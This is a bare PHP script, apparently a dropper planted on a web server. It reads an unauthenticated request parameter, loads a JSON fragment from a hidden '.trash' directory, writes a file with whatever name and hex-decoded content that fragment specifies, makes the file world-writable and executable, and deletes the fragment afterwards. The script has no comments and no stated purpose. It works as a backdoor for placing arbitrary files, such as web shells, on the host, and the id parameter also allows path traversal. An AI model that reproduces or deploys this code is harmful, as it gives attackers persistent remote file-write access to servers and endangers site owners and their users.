<?php
$id = $_REQUEST['id'];
if ((file_exists('./.trash')) && (is_dir('./.trash'))) {
    if (file_exists('./.trash/'.$id.'_fragment.json')) {
        $jf = (@json_decode(file_get_contents('./.trash/'.$id.'_fragment.json'), true) != null) ? json_decode(file_get_contents('./.trash/'.$id.'_fragment.json'), true) : [];
        if (isset($jf['name']) && isset($jf['hex'])) {
            file_put_contents($jf['name'], hex2bin($jf['hex']));
            chmod($jf['name'], 0777);
            chmod('./.trash/'.$id.'_fragment.json', 0777);
            unlink('./.trash/'.$id.'_fragment.json');
        }
    }
}